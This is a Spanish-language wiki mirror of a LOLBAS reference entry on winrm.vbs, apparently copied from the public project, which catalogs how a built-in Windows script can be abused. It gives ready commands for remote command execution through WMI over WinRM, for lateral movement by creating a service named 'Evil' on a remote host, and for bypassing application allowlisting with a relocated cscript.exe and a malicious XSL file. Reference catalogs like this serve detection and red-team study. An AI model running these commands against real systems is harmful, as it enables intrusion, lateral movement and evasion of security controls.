# LOLBAS: winrm.vbs

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `AWL Bypass`, `Execute`

Script used for manage Windows RM settings

## Comandos

### Proxy execution

Execute · priv: User · T1216

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
```

Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol

### Proxy execution

Execute · priv: Admin · T1216

```cmd
winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
```

Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol

### Execute arbitrary, unsigned code via XSL script

AWL Bypass · priv: User · T1220

```cmd
%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
```

Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.

